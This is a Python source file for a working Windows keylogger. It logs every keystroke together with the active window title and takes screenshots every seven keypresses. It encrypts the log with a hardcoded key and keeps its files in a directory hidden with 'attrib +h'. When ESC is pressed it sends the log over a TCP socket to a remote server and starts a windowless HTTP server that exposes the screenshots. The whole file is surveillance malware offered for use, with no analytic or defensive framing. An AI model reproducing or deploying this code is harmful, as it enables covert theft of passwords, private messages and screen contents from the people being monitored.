import os
import socket
from pynput.keyboard import Key, Listener
import win32gui
from datetime import datetime
from PIL import ImageGrab
from cryptography.fernet import Fernet
import subprocess

# Fernet key for encryption.
key = b'fqcKPySL2MqDArnC5tWlJDdODBGN5IlVmHnIv58wFK4='
cipher_suite = Fernet(key)

# Function to get the active window title
def get_active_window_title():
    try:
        hwnd = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(hwnd)
        return title
    except Exception as e:
        print(f"Error getting window title: {e}")
        return ""


# Get screenshot
def take_screenshot():
    try:
        screen_shot = ImageGrab.grab()
        screen_shot_format = datetime.now().strftime("%Y%m%d_%H%M%S")
        screen_shot_path = f"{screen_shot_format}.png"
        screen_shot.save(screen_shot_path)  # Save the screenshot
        encrypt_and_log(f"Screenshot taken: {screen_shot_path}")

    except Exception as e:
        print(f"Error taking screenshot: {e}")


# Function to encrypt and log
def encrypt_and_log(message):
    try:
        timestamp = datetime.now().strftime("%H:%M:%S")
        window_title = get_active_window_title()
        log_entry = f"[{timestamp}] Window Title: '{window_title}', Message: '{message}'\n"

        # Encrypt the log entry
        encrypted_log_entry = cipher_suite.encrypt(log_entry.encode())

        # Write encrypted log entry to file
        with open('loggerv2.txt', 'ab') as file:
            file.write(encrypted_log_entry + b"\n")

    except Exception as e:
        print(f"Error writing to log file: {e}")


# Function to transfer files.
def transfer_files():
    # Server details.
    SERVER_IP = '192.168.0.125' # Edit the IP address of the server.
    SERVER_PORT = 12345         # Edit the port number in which server is listening.

    # Make a socket connection to the server.
    try:
        server_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # IPV4, TCP connection.
        server_connection.connect((SERVER_IP, SERVER_PORT)) # Code to connect to the server using it's IP address and port number.

    except:
        transfer_files()  # If the connection gets some error, we will try to connect to the server again, this process will run forever.

    # Transfer the log file to the server.
    with open('loggerv2.txt','rb') as f:
        file_data = f.read()
        server_connection.sendall(file_data)

    # Serve the entire folder in HTTP so, we could download PNG files.
    #http_server()

def http_server():
    subprocess.Popen(['python', '-m', 'http.server', '9090'], creationflags=subprocess.CREATE_NO_WINDOW)

# Listener function
def if_key_press(key):
    global on_press_counter
    try:
        if key == Key.esc:
            # Stop the listener if ESC key is pressed
            transfer_files()
            http_server()
            return False
        else:
            # Log the key press
            encrypt_and_log(str(key))
            on_press_counter += 1
            print(f"Key pressed count: {on_press_counter}")

            # Take screenshot every 7 key presses
            if on_press_counter == 7:
                take_screenshot()
                on_press_counter = 0

    except Exception as e:
        print(f"Error processing key press: {e}")


on_press_counter = 0

# Create a hidden directory and write everything in that hidden directory.
try:
    # Check if running dir is present.
    os.system('mkdir hidden')
    os.system('attrib +h hidden')
    os.chdir('hidden')

except:
    pass


# Starting the listener
with Listener(on_press=if_key_press) as listener:
    listener.join()
